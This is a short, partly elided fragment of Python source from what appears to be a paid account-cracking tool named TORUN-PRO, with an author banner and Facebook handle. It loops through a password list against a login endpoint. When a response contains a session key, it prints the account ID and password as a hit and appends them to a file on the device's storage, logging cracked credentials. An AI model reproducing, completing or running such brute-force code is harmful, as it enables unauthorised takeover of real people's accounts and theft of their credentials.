...
----------------------------------------------
 Author    : TORUNA810
 Github    : TORUNA810
 Facebook  : MR.TORUN.GANDO
 Tool Name : TORUN-PRO
 Type type : PAID
 Version   : 2.8.9
----------------------------------------------
 AKING Pro version 2.8?9
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/TORUN-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [TORUN-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/TORUN-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [TORUN-OK] '+uid+' | '+pas+'\033[1;97m')
